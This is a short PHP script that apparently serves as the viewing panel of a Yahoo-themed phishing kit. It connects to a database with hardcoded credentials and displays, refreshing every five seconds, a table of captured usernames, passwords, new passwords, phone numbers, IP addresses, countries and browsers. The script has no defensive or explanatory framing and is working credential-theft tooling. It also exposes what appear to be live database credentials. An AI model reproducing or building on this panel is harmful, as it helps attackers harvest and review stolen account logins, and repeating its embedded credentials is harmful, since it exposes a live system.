<?php
header("refresh:5");

$con=mysqli_connect('localhost','allwwumq_maxino','i5$4M=PU_8?G','allwwumq_yahoo');

$view=mysqli_query($con, "SELECT * FROM mails ORDER BY id DESC");
    
    echo "<div style='text-align:center; margin-left:200px; margin-right:200px;'>";
    echo "<table border=2>";
    echo "<th>id</th>";
    echo "<th>username</th>";
    echo "<th>password</th>";
    echo "<th>new password</th>";
    echo "<th>phone number</th>";
    echo "<th>ip address</th>";
    echo "<th>date</th>";
    echo "<th>country</th>";
    echo "<th>browser</th>";

while($row=mysqli_fetch_assoc($view)){
    $id=$row['id'];
    $user=$row['username'];
    $pass=$row['password'];
    $npass=$row['new_password'];
    $phone=$row['phone'];
    $ip=$row['ip'];
    $date=$row['date'];
    $country=$row['country'];
    $browser=$row['browser'];
    
    echo "<tr>";
    echo "<td>$id</td>";
    echo "<td>$user</td>";
    echo "<td>$pass</td>";
    echo "<td>$npass</td>";
    echo "<td>$phone</td>";
    echo "<td>$ip</td>";
    echo "<td>$date</td>";
    echo "<td>$country</td>";
    echo "<td>$browser</td>";
    echo "</tr>";
}
    echo "</table>";
    echo "</div>";

?>